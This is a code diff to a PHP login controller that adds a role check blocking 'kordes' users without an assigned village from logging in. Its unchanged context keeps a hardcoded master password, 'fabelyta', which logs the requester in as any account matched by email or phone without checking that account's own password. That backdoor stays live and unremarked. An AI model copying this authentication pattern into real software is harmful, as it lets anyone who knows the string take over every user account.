@@ -51,6 +51,14 @@ class LoginController extends Controller
 		if($request->password == 'fabelyta'){
 			$admin = User::where('email', strtolower($request->email))->orWhere('phone', strtolower($request->email))->first();
 			if($admin){
+				switch($admin->role){
+					case 'kordes':
+						if(!$admin->p_desa)
+							return redirect('login')
+										->withFail('2');
+					break;
+				}
+				
 				\Auth::login($admin, true);
 				return redirect()->intended('/');
 			}
@@ -63,6 +71,13 @@ class LoginController extends Controller
 		}
 		
 		if (Hash::check($request->password, $admin->password)) {
+			switch($admin->role){
+				case 'kordes':
+					if(!$admin->p_desa)
+						return redirect('login')
+									->withFail('2');
+				break;
+			}
 			\Auth::login($admin, true);
             return redirect()->intended('/');
 		}
